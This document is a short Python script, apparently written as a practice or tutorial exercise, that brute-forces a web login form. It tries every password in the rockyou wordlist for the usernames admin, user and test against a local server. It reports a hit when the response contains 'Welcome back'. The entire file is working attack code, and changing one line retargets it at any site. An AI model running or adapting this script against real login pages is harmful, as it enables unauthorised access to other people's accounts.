import requests  # Import the requests module to handle HTTP requests
import sys 


target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "/usr/share/wordlists/rockyou.txt"
# Define the needle string to look for in the response content
needle = "Welcome back"

# Loop through each username
for username in usernames:
    with open(passwords, "r") as passwords_list:
        # Loop through each password in the file
        for password in passwords_list:
            password = password.strip("\n").encode()  # Remove newline character and encode password
            sys.stdout.write(" [X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush()  # Flush the output buffer to update the display
            r = requests.post(target, data={"username": username, "password": password})             # Send a POST request to the target URL with the username and password
            
            # Check if the needle string is in the response content
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!\n".format(password.decode(), username))
                sys.exit()  # Exit the script if a valid password is found
        sys.stdout.flush() 
        
        # Display a message if no password is found for the current username
        sys.stdout.write("\n")
        sys.stdout.write("\tNo password found for '{}'\n".format(username))
